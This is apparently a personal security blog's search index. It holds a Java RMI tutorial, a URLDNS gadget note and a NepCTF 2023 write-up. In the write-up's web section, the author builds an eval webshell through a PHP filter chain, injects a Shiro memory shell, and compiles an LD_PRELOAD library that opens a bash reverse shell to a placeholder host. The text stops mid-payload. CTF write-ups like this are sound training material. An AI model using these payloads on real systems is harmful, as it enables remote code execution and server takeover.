<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFSHOW-SQL注入</title>
      <link href="/2023/08/30/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/08/30/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFHUB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS</title>
      <link href="/2023/08/23/URLDNS/"/>
      <url>/2023/08/23/URLDNS/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><code>URLDNS</code> 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>项目地址：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-RMI</title>
      <link href="/2023/08/17/Java-RMI/"/>
      <url>/2023/08/17/Java-RMI/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RMI (Java Remote Method Invocation) Java 远程方法调用，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制</p><p>RMI 可以使用以下协议实现：</p><ul><li>Java Remote Method Protocol (JRMP)：专门为 RMI 设计的协议</li><li>Internet Inter-ORB Protocol (IIOP) ：基于 <code>CORBA</code> 实现的跨语言协议</li></ul><p>RMI 程序通常包括</p><ul><li><code>rmi registry</code> naming service，提供 remote object 注册，name 到 remote object 的绑定和查询，是一种特殊的 remote object</li><li><code>rmi server</code> 创建 remote object，将其注册到 RMI registry</li><li><code>rmi client</code> 通过 name 向 RMI registry 获取 remote object reference (stub)，调用其方法</li></ul><p>官方文档中的图例</p><p><img src="/img/Java-RMI/rmi-2.gif" alt=""></p><p>通常 RMI server 和 registry 运行在同一个 host 的不同端口上</p><blockquote><p>RMI Registry 默认运行在 1099 端口上</p><p>RMI URL <code>rmi://hostname:port/remoteObjectName</code></p></blockquote><p>具体参考：<a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">RMI Overview</a></p><h1 id="一个简单的RMI"><a href="#一个简单的RMI" class="headerlink" title="一个简单的RMI"></a>一个简单的RMI</h1><p><strong>在客户端中创建如下代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RMI.Server.IRemoteObj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RMI.Server.<span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.sayHello(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//sayHello就是客户端要调用的方法，需要抛出RemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在服务端创建如下代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//注册中心</span></span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);<span class="comment">//注册中心绑定</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建字符串转大写方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line"><span class="comment">//        UnicastRemoteObject.exportObject(this,0);//如果不继承UnicastRemoteObject就需要手工导出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口（要与客户端一样）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//sayHello就是客户端要调用的方法，需要抛出RemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行服务端</strong></p><p><img src="/img/Java-RMI/rmi.png" alt=""></p><p><strong>运行客户端</strong></p><p><img src="/img/Java-RMI/rmi_01.png" alt=""></p><p><strong>查看服务端进程</strong></p><p><img src="/img/Java-RMI/rmi_02.png" alt=""></p><p>发现在客户端调用了服务端的字符串转大写的方法，并输出到服务端，实现了远程执行代码，完成了一次简单的RMI</p><h1 id="流程原理"><a href="#流程原理" class="headerlink" title="流程原理"></a>流程原理</h1><p><img src="/img/Java-RMI/rmi_03.png" alt=""></p><p><strong>注册中心：</strong></p><p>位于图中部分，类似于哈希表，对应名字和远程对象</p><p><strong>服务端：</strong></p><p>位于图左部分，发布远程对象</p><p><strong>客户端：</strong></p><p>位于图右部分，连接注册中心，调用远程对象</p><blockquote><p>服务端与客户端传输用的是<code>Socket</code>，协议为JRMP协议</p><p>服务端与客户端连接利用了代理，服务端是<code>Skeleton</code>，客户端是<code>Stub</code></p><p>代理的作用：把一些业务逻辑之外的东西提取出来</p></blockquote><p>漏洞在通信部分产生，而它们之间两两之间会有通信，总共会有六个部分</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端-&gt;服务端，服务端-&gt;客户端</span><br><span class="line">服务端-&gt;注册中心，注册中心--&gt;服务端</span><br><span class="line">客户端--&gt;注册中心，注册中心--&gt;客户端</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF-2023</title>
      <link href="/2023/08/17/NepCTF-2023/"/>
      <url>/2023/08/17/NepCTF-2023/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_symbols = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq_bytes = f.read(<span class="number">1</span>)[<span class="number">0</span>], f.read(<span class="number">4</span>)</span><br><span class="line">            freq = (freq_bytes[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (freq_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (freq_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | freq_bytes[<span class="number">3</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line">        bit_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data)</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bit_string:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decompressed_data.append(current_node.char)</span><br><span class="line">            current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br></pre></td></tr></table></figure><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>进去是个C语言的代码执行器</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-12-42.png" alt=""></p><p>提示说环境变量里面有flag，尝试打印环境变量</p><p><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">linux下获取系统环境变量</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-14-34.png" alt=""></p><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img src="/img/NepCTF-2023/1.png" alt=""></p><p>给了hint：<code>Atsuko Kagari</code></p><p>发现了这是一个动漫：小魔女学园</p><p>了解到这是新月文字和古龙语（我看像鸡脚语）</p><p>百度贴吧找到对照：</p><p><img src="/img/NepCTF-2023/2.png" alt=""></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEARTISYOURMAGIC</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/3.png" alt=""></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEPNEPABELIEVING</span><br></pre></td></tr></table></figure><p>拼起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure><h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>下载后发现是一段音频，用Audacity打开</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_11-00-17.png" alt=""></p><p>发现不是长就是短的，猜测是摩斯密码，一个个对，发现真是，得到提示</p><p><code>you should use this to xor something</code></p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_11-01-28.png" alt=""></p><p>发现了一段字符串</p><p><code>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</code></p><p>看提示应该是要寻找另一串字符串，尝试与题目给的字符串异或</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-10-07.png" alt=""></p><p>成功！拿到flag</p><h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><blockquote><p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p><p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p><p>三月七：那我们快想想怎么解开这个谜题！</p><p>flag格式:NepCTF{+m+}</p><p>hint:URL为压缩包密码</p></blockquote><p><strong>txt文件：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>题目描述：群名很咸，<code>salt</code>（长度为10），因为加了NepCTF的QQ群，发现群名<code>NepCTF2023</code>正好长度为十，推测<code>salt：NepCTF2023</code></p><p>经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)</p><p>猜测我们对<code>NepCTF2023</code>经过sha256后可以得到<code>key</code> ，取出前32位：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb6</span><br></pre></td></tr></table></figure><p>然后AES解密=&gt;hex解密=&gt;base64解密：</p><p><img src="/img/NepCTF-2023/20.png" alt=""></p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p><img src="/img/NepCTF-2023/21.png" alt=""></p><p><strong>星穹铁道文字：</strong></p><p><img src="/img/NepCTF-2023/22.png" alt=""></p><p><strong>翻译一下：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;HRP_always_likes_March_7th&#125;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezjava-Chekin"><a href="#Ezjava-Chekin" class="headerlink" title="Ezjava_Chekin"></a>Ezjava_Chekin</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=shiro_attack-4.7.0-SNAPSHOT-al&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142^v92^koosearch_v1&amp;spm=1018.2226.3001.4187">详细shiro漏洞复现及利用方法（CVE-2016-4437）</a></p><p>直接利用shiro反序列化工具一把梭</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-56-01.png" alt=""></p><p>注入内存马（换jsp类型）</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-56-34.png" alt="">连接成功</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-57-05.png" alt=""></p><p>访问start.sh，拿到flag</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-57-43.png" alt=""></p><h2 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h2><p>进入页面，有如下界面</p><p><img src="/img/NepCTF-2023/4.png" alt=""></p><p>将<code>?</code>后面的内容删去后方访问：</p><p><img src="/img/NepCTF-2023/5.png" alt=""></p><p>提示让我们访问<code>/jump.php?hint</code></p><p><img src="/img/NepCTF-2023/6.png" alt=""></p><p>发现这是一个文件包含，且加后缀<code>.txt</code>，在注释里提示可以访问<code>hint.ini</code></p><p><img src="/img/NepCTF-2023/7.png" alt=""></p><p>发现远程文件包含利用不了，提示里有一篇文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>可以在github上找到利用脚本：<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/8.png" alt=""></p><p>这样就成功了</p><p><img src="/img/NepCTF-2023/9.png" alt=""></p><p>但是查看一下<code>disable_functions、disable_classes</code> 把很多的函数和类给禁用了,还限制了<code>open_basedir=/var/www/html:/tmp</code></p><p>所以我们需要想办法 <code>php disable_function bypass</code></p><p><img src="/img/NepCTF-2023/10.png" alt=""></p><p><strong>劫持LD_PRELOAD绕过disable_functions</strong></p><blockquote><p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p><p>劫持步骤：</p><ol><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>Getshell</li></ol></blockquote><p>这个php的函数很关键。可以使用<code>mail、error_log</code>等，但是这里被禁用了</p><p>我们还可以使用<code>mb_send_mail()</code></p><p><img src="/img/NepCTF-2023/11.png" alt=""></p><p>它是<code>mail()</code>的包装函数，因此也可以进行劫持</p><p>我们需要先编写一个恶意poc.c文件：(用来反弹shell)</p><blockquote><p><strong>attribute</strong>语法格式为：<strong>attribute</strong> ( ( attribute-list ) )<br>若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，<br>则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">angel</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译一下生成恶意动态链接程序<code>poc.so</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/12.png" alt=""></p><p>然后需要把这个文件给上传到服务器上去，并且使用<code>putenv()</code>函数重新设置<code>LD_PRELOAD</code>环境变量，最后使用<code>mb_send_mail()</code>调用恶意的函数进行反弹shell</p><p>但是这里有个问题，我们没权限上传文件和写文件，相关函数被禁用了。</p><p>这里有一种方法是上传临时文件<code>/tmp/phpxxx</code>，然后使用<code>scandir(&quot;glob:///tmp/php*&quot;)</code>去模糊匹配的</p><p>在本地写一个上传文件的<code>html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将恶意的<code>.so</code>文件上传并抓包，将数据包下面内容进行更改：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;/tmp&#x27;</span>));<span class="variable">$a</span>=scandir(<span class="string">&quot;glob:///tmp/php*&quot;</span>);<span class="variable">$filename</span>=<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$a</span>[0];var_dump(<span class="variable">$filename</span>);putenv(<span class="string">&quot;LD_PRELOAD=<span class="variable">$filename</span>&quot;</span>);mb_send_mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span 